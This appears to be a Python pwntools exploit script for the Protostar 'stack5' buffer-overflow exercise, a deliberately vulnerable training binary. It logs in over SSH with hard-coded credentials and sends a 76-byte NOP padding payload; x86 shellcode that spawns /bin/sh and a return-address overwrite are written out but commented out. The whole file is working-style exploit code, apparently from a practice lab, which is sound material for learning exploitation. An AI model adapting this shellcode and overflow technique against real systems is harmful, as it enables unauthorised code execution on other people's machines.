#!/usr/bin/env python
from pwn import *
import sys
offset = 76
if len(sys.argv) < 2:
    print("usage: ./%s <ip>" % sys.argv[0])
else:
    s = ssh("user", sys.argv[1], 22, password="user")
#    shellcode = "\xeb\x0b\x5b\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\xcd\x80\xe8\xf0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"
    payload = "\x90"* offset
#    payload += shellcode
#    payload += p32(0xbffffb53) addr to win
    payload += '\n'
    r = s.run('/opt/protostar/bin/stack5')
    r.send(payload)
    print(r.recv(1024))
    r.close()

